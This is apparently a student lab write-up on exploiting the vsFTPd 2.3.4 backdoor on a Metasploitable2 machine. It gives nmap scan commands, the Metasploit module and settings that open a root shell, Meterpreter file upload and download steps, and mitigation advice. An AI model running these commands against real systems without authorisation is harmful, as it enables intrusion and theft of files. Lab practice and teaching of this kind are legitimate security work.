# üîê System Hacking ‚Äì Gaining Access to a Vulnerable Machine

## üß† Objective
This ethical hacking project simulates a real-world exploitation scenario where a penetration tester targets a vulnerable system (Metasploitable2) using the Metasploit Framework. The objective is to identify susceptible services, exploit them, gain shell access, escalate privileges, and demonstrate basic post-exploitation actions.

---

## üõ†Ô∏è Tools Used

- **Kali Linux**
- **Metasploit Framework**
- **Metasploitable2 (vulnerable target machine)**
- `nmap`, `whoami`, `uname`, `ls`, and other Linux commands

---

## üõ∞Ô∏è Scanning and Enumeration

**1) General nmap scan (to feel around)**
```bash
nmap <target-IP>
```

**2) Detailed nmap scan to see services and versions**
- Discovered open port: `21/tcp` (FTP)
- Service detected: `vsFTPd 2.3.4` ‚Äî a known vulnerable service with a backdoor.

```bash
nmap -A -sV <target-IP>
```

## üí£ Exploitation Process

**1) Exploit Module Used:**

```
exploit/unix/ftp/vsftpd_234_backdoor
```

**2) Metasploit Commands:**

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <target-IP>
set RPORT 21
run
```

üìç Successfully spawned a root-level shell:
```
[*] Command shell session 1 opened
```

## üß™ Post-Exploitation

- Verified root access with `whoami` ‚Üí `root`

- Navigated the file system, listed directories

- Transferred files from attacker to victim using the Meterpreter `upload` command

![Exploit](images/upload1.png)


- Downloaded the victim's files back to Kali using the `download` command

## ‚ö†Ô∏è Challenges Faced & Resolutions

| Challenge | Solution |
|----------|----------|
| No internet access in Kali VM | Switched VM network adapter from Host-Only to NAT |
| Metasploit exploit failed to recreate session after closing | Rebooted Metasploitable2 to restart vulnerable FTP service |
| Upload error in normal shell | Upgraded to Meterpreter for advanced file interaction |
| Difficulty identifying active sessions | Used `sessions -i <id>` instead of `sessions` |
| Command confusion between shell and Meterpreter | Ensured proper shell upgrade and command context awareness |

---

## ‚úÖ Result/Outcome

Successfully gained root-level access to the target machine, demonstrated file transfer techniques post-exploitation, and documented how to secure systems against such attacks.

---

## üõ°Ô∏è Mitigation Recommendations

To prevent exploitation of similar vulnerabilities in a production environment:

- Always keep services and operating systems updated.
- Replace outdated or unsupported software.
- Disable unnecessary services and ports.
- Use firewalls to control inbound/outbound traffic.
- Enforce least privilege and proper user access controls.
- Regularly scan systems for known vulnerabilities.
